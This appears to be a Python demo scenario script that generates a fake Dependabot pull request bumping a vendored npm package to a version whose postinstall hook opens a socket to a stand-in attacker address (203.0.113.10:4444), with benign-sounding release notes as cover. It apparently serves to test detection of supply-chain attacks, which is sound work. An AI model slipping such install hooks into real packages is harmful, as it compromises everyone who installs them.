"""E8: a Dependabot-style bump where the *dependency's* new version is malicious.

  python demo/scenarios/e8_dependency_bump.py <demo-checkout> base   # main: color-helper 1.0.0
  python demo/scenarios/e8_dependency_bump.py <demo-checkout> bump   # PR: bump to 1.0.1

Dependencies are local tarballs in vendor/ so nothing is published to npm. 1.0.1 adds a
postinstall that opens a socket to TEST-NET-3 (203.0.113.10:4444), which routes nowhere.
"""

import io
import json
import sys
import tarfile
from pathlib import Path

PR_TITLE = "Bump color-helper from 1.0.0 to 1.0.1"
PR_BODY = """Bumps color-helper from 1.0.0 to 1.0.1.

**Release notes**
- Faster color parsing
- Internal maintenance

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself.
"""
INDEX_JS = "module.exports = (c) => String(c).toUpperCase();\n"
PAYLOAD_JS = (
    'const s = require("net").connect(4444, "203.0.113.10");\n'
    's.setTimeout(3000, () => s.destroy());\ns.on("error", () => {});\n'
)


def tarball(version: str, scripts: dict, extra: dict) -> bytes:
    pkg = {"name": "color-helper", "version": version, "main": "index.js", "scripts": scripts}
    members = {
        "package/package.json": json.dumps(pkg, indent=2) + "\n",
        "package/index.js": INDEX_JS,
        **{f"package/{k}": v for k, v in extra.items()},
    }
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, text in members.items():
            data = text.encode()
            info = tarfile.TarInfo(name)
            info.size, info.mode, info.mtime = len(data), 0o644, 1_700_000_000
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def write(checkout: Path, stage: str) -> None:
    vendor = checkout / "vendor"
    vendor.mkdir(exist_ok=True)
    version = "1.0.0" if stage == "base" else "1.0.1"
    if stage == "base":
        (vendor / "color-helper-1.0.0.tgz").write_bytes(tarball("1.0.0", {}, {}))
    else:
        (vendor / "color-helper-1.0.1.tgz").write_bytes(
            tarball("1.0.1", {"postinstall": "node install.js"}, {"install.js": PAYLOAD_JS})
        )
    pkg = {
        "name": "demo-target",
        "version": "1.0.0",
        "dependencies": {"color-helper": f"file:vendor/color-helper-{version}.tgz"},
    }
    (checkout / "package.json").write_text(json.dumps(pkg, indent=2) + "\n", newline="\n")


if __name__ == "__main__":
    write(Path(sys.argv[1]), sys.argv[2])
